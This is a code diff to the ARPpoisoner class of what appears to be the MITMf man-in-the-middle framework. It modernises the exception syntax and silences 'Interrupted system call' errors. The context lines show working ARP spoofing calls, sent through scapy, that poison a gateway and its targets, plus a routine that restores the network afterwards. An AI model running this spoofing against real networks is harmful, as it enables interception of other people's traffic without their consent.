@@ -93,8 +93,9 @@ class ARPpoisoner():
                             sleep(0.3)
                             send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)
 
-                    except Exception, e:
-                        mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                    except Exception as e:
+                        if "Interrupted system call" not in e:
+                           mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                         pass
 
             sleep(self.interval)
@@ -119,10 +120,11 @@ class ARPpoisoner():
                             sleep(0.3)
                             send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)
 
-                    except Exception, e:
-                        mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
+                    except Exception as e:
+                        if "Interrupted system call" not in e:
+                           mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                         pass
-            
+
             sleep(self.interval)
 
     def restoreNet(self, count):
@@ -145,6 +147,7 @@ class ARPpoisoner():
                     sleep(0.3)
                     send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)
 
-            except Exception, e:
-                mitmf_logger.error("[ARPpoisoner] Exception occurred while restoring connection {}: {}".format(targetip, e))
+            except Exception as e:
+                if "Interrupted system call" not in e:
+                   mitmf_logger.error("[ARPpoisoner] Exception occurred while poisoning {}: {}".format(targetip, e))
                 pass
